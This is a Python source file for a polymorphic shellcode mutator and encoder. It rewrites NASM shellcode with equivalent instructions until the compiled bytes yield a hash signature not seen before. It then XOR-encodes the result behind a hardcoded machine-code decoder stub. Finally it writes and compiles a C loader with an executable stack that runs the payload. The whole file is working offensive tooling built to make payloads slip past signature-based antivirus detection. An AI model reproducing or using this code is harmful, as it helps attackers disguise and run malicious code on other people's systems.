import json
import sys
import subprocess
from random import randint
import os.path as os_path
from hashlib import sha256, md5

KNOWN_ASM_INSTRUCTIONS = {
    "push": {"parsing_args": [" "], "equivalent_mods": []},
    "pop": {"parsing_args": [" "], "equivalent_mods": []},
    "mov": {"parsing_args": [","], "equivalent_mods": [{"args": ["reg_1", "reg_2"], "rep": [[["push", "reg_2"], ["pop", "reg_1"]]]}]},
    "xor": {"parsing_args": [","], "equivalent_mods": []},
    "dec": {"parsing_args": [" "], "equivalent_mods": []},
    "inc": {"parsing_args": [" "], "equivalent_mods": []},
    "sub": {"parsing_args": [","], "equivalent_mods": []},
    "add": {"parsing_args": [","], "equivalent_mods": []},
    "syscall": {"parsing_args": [], "equivalent_mods": []},
    "BITS": {"parsing_args": [" "], "equivalent_mods": []},
    "SECTION": {"parsing_args": [" "], "equivalent_mods": []},
    "global": {"parsing_args": [" "], "equivalent_mods": []},
    "_start:": {"parsing_args": [], "equivalent_mods": []},
    }

ENCODER_STUD = "\\xe9\\x8f\\x00\\x00\\x00\\x48\\x31\\xc0\\x48\\x31\\xc9\\x48\\x31\\xdb\\x48\\x31\\xd2\\x48\\x83\\xc1\\x04\\x88\\xcd\\x88\\xd9\\x5e\\xbf\\x90\\x90\\xaa\\xaa\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x88\\xe9\\xfe\\xc9\\xfe\\xc3\\xfe\\xc5\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x30\\xff\\x49\\x89\\xd1\\x48\\x01\\xda\\x8a\\x3c\\x16\\x4c\\x89\\xca\\x32\\x3c\\x16\\x49\\x89\\xc1\\x41\\x88\\xca\\x4d\\x01\\xca\\x4c\\x89\\xd0\\x88\\x3c\\x04\\x4c\\x89\\xc8\\xfe\\xc3\\xfe\\xc9\\x38\\xeb\\x75\\xcf\\x88\\xe9\\x30\\xed\\x31\\xdb\\x4d\\x31\\xd2\\x49\\x89\\xd1\\x41\\x88\\xca\\x4d\\x01\\xca\\x4c\\x89\\xd2\\x39\\x3c\\x16\\x74\\x10\\x4c\\x89\\xca\\x48\\x01\\xca\\x48\\xff\\xc9\\x48\\x01\\xc8\\x88\\xcd\\x75\\x9d\\xff\\xe4\\xe8\\x6c\\xff\\xff\\xff"
ASM_HELPER_FILE = "asm_helper.json"

# Parses asm instructions line, returns Dict with parsed instructions
def parse_asm_instructions(instructions):
    parsed_instructions = {"name": "", "arguments": []}
    split_instructions = instructions.split(' ')
    # If known instruction
    if split_instructions[0] in KNOWN_ASM_INSTRUCTIONS:
        parsed_instructions["name"] = split_instructions[0]
        # Parse instruction arguments
        for i in range(1, len(split_instructions)):
            if split_instructions[i] == '':
                continue
            args = [split_instructions[i]]
            # Use parsing spliting characters
            for required in KNOWN_ASM_INSTRUCTIONS[split_instructions[0]]["parsing_args"]:
                # Loop args (in case we find new ones)
                j = 0
                while j != len(args):
                    tmp_arg = args[j]
                    # Split using parsing char
                    split_args = tmp_arg.split(required)
                    # If arg is splited
                    if len(split_args) == 2:
                        # If new arguments are found
                        if split_args[0] != '' and split_args[1] != '':
                            # Do some magic shit to add the new arguments
                            tmp_args = []
                            for k in range(len(args)):
                                if k == j:
                                    tmp_args.append(split_args[0])
                                    tmp_args.append(split_args[1])
                                else:
                                    tmp_args.append(args[k])
                            args = tmp_args
                            j += 1
                        elif split_args[0] != '':
                            args[j] = split_args[0]
                        else:
                            args[j] = split_args[1]
                    j += 1

            for arg in args: 
                parsed_instructions["arguments"].append(arg)
    else:
        print("Error: Unkown instruction, found:", split_instructions)
    return parsed_instructions

# Compile the asm file
def compile_asm(asm_file_path, payload="payload"):
    if not os_path.isfile(asm_file_path):
        print("Error: Could not compile asm, file:", asm_file_path)
        return False
    subprocess.run(f"nasm -f elf64 -o out.o {asm_file_path}; ld -o {payload} out.o; rm out.o", shell=True)
    print("Compiled asm !")
    return True

# Convert bytes_string to array of bytes
def bytes_string_to_byte_array(bytes_string):
    bytes_string = bytes_string.replace('\\', '')
    shell_code_bytes = bytearray()
    for hex in bytes_string.split('x'):
        shell_code_bytes.extend(bytearray.fromhex(hex))
    return shell_code_bytes

# Get the payload hex, returns byte string
def get_payload_bytes_string(payload="payload"):
    if not os_path.isfile(payload):
        print("Error: Could not compile asm, file:", payload)
        return False
    cmd = r"for i in $(objdump -d " + payload + r" |grep '^ ' |cut -f2); do echo -n '\x'$i; done; echo"
    payloadHex = subprocess.run(cmd, shell=True, capture_output=True)
    bytes_string = payloadHex.stdout
    return bytes_string.replace(b'\n', b'').decode("utf-8")
    
# Returns sha256 and md5 hash from given bytearray
def get_signature(shell_code_bytes):
    sha256_hash = sha256(shell_code_bytes).hexdigest()
    md5_hash = md5(shell_code_bytes).hexdigest()
    return {"sha256": sha256_hash, "md5": md5_hash}

# Parses whole asm file, returns Dict with parsed asm
def parse_asm(asm_file_path):
    parsed_data = {"payload": "", "signatures": [],"lines": []}
    file_name = os_path.basename(asm_file_path).split('.')
    data_file = file_name[0]+".json"
    # If data file already exists, load it
    if os_path.isfile(data_file):
        print("Parsed file already exist, loading...")
        f = open(data_file, 'r')
        parsed_data = json.load(f)
        f.close()
        return parsed_data
    line_num = 0
    with open(asm_file_path, 'r') as f:
        # Loops on all lines of file
        for line in f:
            # If line is not just '\n'
            if line != '\n':
                # Remove all \n of line
                stripped_line = line.replace('\n', '')
                new_line = {"number": line_num, "instructions": {}, "comments": ""}
                # Splits comments from instructions of line
                split_line = stripped_line.split(';')
                if split_line[0] != '':
                    new_line["instructions"] = parse_asm_instructions(split_line[0])
                if len(split_line) == 2:
                    new_line["comments"] = split_line[1]
                
                # Appends new line Dict to parsed_data
                parsed_data["lines"].append(new_line)
                line_num += 1
    # If compiled correctly add original payload and signature
    if compile_asm(asm_file_path):
        # save bytes string of payload
        parsed_data["payload"] = get_payload_bytes_string()
        # get byte array of payload 
        payload_byte_array = bytes_string_to_byte_array(parsed_data["payload"])
        # Save original signature of payload
        parsed_data["signatures"].append(get_signature(payload_byte_array))

    with open(data_file, 'w') as f:
        json.dump(parsed_data, f, indent=4)
    return parsed_data

def parse_arg(rep_arg, arg):
    parsed_arg = None
    rep_arg_slip = rep_arg.split('_')
    try:
        value = int(arg)
        if rep_arg_slip[0] == "value":
            parsed_arg = value
    except ValueError:
        if rep_arg_slip[0] == "reg":
            arg_split = arg.split('0x')
            if len(arg_split) == 1:
                parsed_arg = arg
    
    return parsed_arg

def get_arithmetic_instruction(rep_line, known_arithmetic_inst=['-', '+']):
    for arith_inst in known_arithmetic_inst:
        rep_args_split = rep_line.split(arith_inst)
        if len(rep_args_split) == 2:
            return arith_inst
    return None

def parse_rep_value(rep_key, parsed_args):
    if not rep_key in parsed_args:
        rep_key_split = rep_key.split('_')
        if len(rep_key_split) == 2:
            if  rep_key_split[0] == "rand":
                rep_value = randint(1, 20)
            else:
                rep_value = rep_key
        else:
            try:
                rep_value = int(rep_key)
                
            except ValueError:
                rep_value = rep_key
        parsed_args[rep_key] = rep_value
    else:
        rep_value = parsed_args[rep_key]
    
    return rep_value

def parse_replacement_instructions(parsed_args, rep_lines):
    replacement_instructions = []
    for rep_line in rep_lines:
        line = rep_line[0] + " "
        for i in range(1, len(rep_line)):
            if i != 1:
                line += KNOWN_ASM_INSTRUCTIONS[rep_line[0]]["parsing_args"][0]

            arithmetic_instruction = get_arithmetic_instruction(rep_line[i])
            
            if arithmetic_instruction == None:
                line += str(parse_rep_value(rep_line[i], parsed_args))
                
            else:
                value = 0
                rep_args_split = rep_line[i].split(arithmetic_instruction)
                for j in range(2):
                    parsed_val = parse_rep_value(rep_args_split[j], parsed_args)
                    if j == 0:
                        value = parsed_val
                    elif arithmetic_instruction == '+':
                        value += parsed_val
                    else:
                        value -= parsed_val
                line += str(value)
            
        replacement_instructions.append(line)
        
    return replacement_instructions

def get_replacement_instructions(parsed_line, lines_replacements):
    parsed_line_args_len = len(parsed_line["arguments"])
    parsed_args = {}
    replacement_instructions = []
    for rep_line in lines_replacements :
        if parsed_line_args_len == len(rep_line["args"]):
            is_incorrect_args = False
            for i in range(parsed_line_args_len):
                parsed_arg = parse_arg(rep_line["args"][i], parsed_line["arguments"][i])
                if parsed_arg != None:
                    if not rep_line["args"][i] in parsed_args:
                        parsed_args[rep_line["args"][i]] = parsed_arg
                    elif parsed_args[rep_line["args"][i]] != parsed_arg:
                        is_incorrect_args = True
                        break
                else:
                    is_incorrect_args = True
                    break
            if not is_incorrect_args:
                rep_line_instructions = rep_line["rep"][randint(0, len(rep_line["rep"])-1)]
                replacement_instructions = parse_replacement_instructions(parsed_args, rep_line_instructions)
                break
    return replacement_instructions

def morph_code(asm_file_path):
    parsed_asm = parse_asm(asm_file_path)
    lines_num = len(parsed_asm["lines"])
    lines_to_gen = randint(int(lines_num*0.05), int(lines_num*0.1))
    lines_generated = 0
    curr_line = 0
    while lines_generated != lines_to_gen:
        if parsed_asm["lines"][curr_line]["instructions"] != {} and not "replacement_instructions" in parsed_asm["lines"][curr_line]:
            if parsed_asm["lines"][curr_line]["instructions"]["name"] in KNOWN_ASM_INSTRUCTIONS:
                if KNOWN_ASM_INSTRUCTIONS[parsed_asm["lines"][curr_line]["instructions"]["name"]]["equivalent_mods"] != []:
                    if randint(0, 10) >= 7:
                        rep_inst = get_replacement_instructions(parsed_asm["lines"][curr_line]["instructions"], KNOWN_ASM_INSTRUCTIONS[parsed_asm["lines"][curr_line]["instructions"]["name"]]["equivalent_mods"])
                        if rep_inst != []:
                            parsed_asm["lines"][curr_line]["replacement_instructions"] = rep_inst
                            lines_generated +=1

        if curr_line < lines_num - 1 :
            curr_line += 1
        else:
            curr_line = 0

    return parsed_asm

def parsed_data_to_asm(parsed_asm, generated_asm_file_path="generated.asm"):
    with open(generated_asm_file_path, 'w') as f:
        for line in parsed_asm["lines"]:
            new_line = ""
            if "replacement_instructions" not in line:
                if line["instructions"] != {}:
                    new_line += line["instructions"]["name"] + " "
                    if len(line["instructions"]["arguments"]) > 0:
                        new_line += line["instructions"]["arguments"][0]
                        for i in range(1, len(line["instructions"]["arguments"])):
                            new_line += KNOWN_ASM_INSTRUCTIONS[line["instructions"]["name"]]["parsing_args"][0]
                            new_line += line["instructions"]["arguments"][i]
                    new_line += " "
                if line["comments"] != "":
                    new_line += '; ' + line["comments"] + '\n'
                else:
                    new_line += '\n'
                f.write(new_line)
            else:
                if line["comments"] != "":
                    new_line += '; ' + line["comments"] + '\n'
                for rep_line in line["replacement_instructions"]:
                    new_line += rep_line + '\n'
                f.write(new_line)
    
def add_signature(asm_file_path, new_signature):
    file_name = os_path.basename(asm_file_path).split('.')
    data_file = file_name[0]+".json"
    parsed_asm = parse_asm(asm_file_path)
    parsed_asm["signatures"].append(new_signature)
    with open(data_file, 'w') as f:
        json.dump(parsed_asm, f, indent=4)

def check_is_unique(gen_parsed_asm, asm_file_path):
    gen_asm_file = "gen.asm"
    payload_file = "payload"
    parsed_data_to_asm(gen_parsed_asm, gen_asm_file)
    compile_asm(gen_asm_file, payload_file)
    gen_asm_bytes_string = get_payload_bytes_string(payload_file)
    gen_asm_bytes = bytes_string_to_byte_array(gen_asm_bytes_string)
    gen_asm_signature = get_signature(gen_asm_bytes)
    for signature in gen_parsed_asm["signatures"]:
        if signature == gen_asm_signature:
            return False, None

    add_signature(asm_file_path, gen_asm_signature)
    return True, gen_asm_bytes_string

def encode_shell_code(shell_code_bytes_strings):
    bytes_to_xor = 4
    shell_code_bytes = bytes_string_to_byte_array(shell_code_bytes_strings)

    # If shellcode is not 4 bytes aligned, add padding bytes at the end
    if len(shell_code_bytes) % bytes_to_xor != 0:
        padding = bytes_to_xor - (len(shell_code_bytes) % bytes_to_xor)
        for i in range(0, padding):
                shell_code_bytes.append(0x90)

    shell_code_encoded = bytearray()

    for i in range(0, len(shell_code_bytes), bytes_to_xor):
        xor_byte_good = False
        while(xor_byte_good == False):
                check_byte = True
                # Generate random XOR byte
                r = randint(1,255)
                # Check that resulting shellcode doesn't contain null bytes
                for j in range(bytes_to_xor):
                    if (r ^ shell_code_bytes[i+j] == 0):
                            check_byte = False
                if check_byte:
                    xor_byte_good = True


        # Encoded shellcode contains XOR byte + next bytes_to_xor bytes reversed
        shell_code_encoded.append(r)
        for k in range(bytes_to_xor-1, -1, -1):
            shell_code_encoded.append(shell_code_bytes[i+k] ^ r)
        
        # Add end of shellcode marker
    shell_code_encoded.append(0x90)
    shell_code_encoded.append(0x90)
    shell_code_encoded.append(0xaa)
    shell_code_encoded.append(0xaa)

    shell_code_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shell_code_encoded)
    shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shell_code_encoded).rstrip(',')
    print(f"Generated ShellCode: {shell_code_bytes_strings}\n")
    print(f"Encoded Gen ShellCode: {shell_code_encoded_hex}\n")
    #print(f"Encoded Gen ShellCode asm: {shellcode_encoded_nasm}\n")
    print(f"Encoder Stud + Encoded Gen ShellCode: {ENCODER_STUD+shell_code_encoded_hex}")
    write_payloadc(ENCODER_STUD+shell_code_encoded_hex)

def write_payloadc(payload):
    payloadc_file = "payload.c"
    #payload = payload.replace("\\", "\\\\")
    with open(payloadc_file, 'w') as f:
        content = 'int main(int argc, char **argv){char code[] = "'+ payload +'";int (*func)();func = (int (*)())code;(int)(*func)();}'
        f.write(content)
    
    cmdCompileC = "gcc -o ../output/exec_c payload.c -fno-stack-protector -z execstack"
    subprocess.call(cmdCompileC, shell=True)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: {name} [shellcode_file]'.format(name = sys.argv[0]))
        exit(1)

    shell_code_file = sys.argv[1]

    with open(ASM_HELPER_FILE, 'r') as f:
        KNOWN_ASM_INSTRUCTIONS = json.load(f)
    
    gen_is_unique = False
    while not gen_is_unique:
        gen_parsed_asm = morph_code(shell_code_file)
        gen_is_unique, bytes_strings = check_is_unique(gen_parsed_asm, shell_code_file)
    
    encode_shell_code(bytes_strings)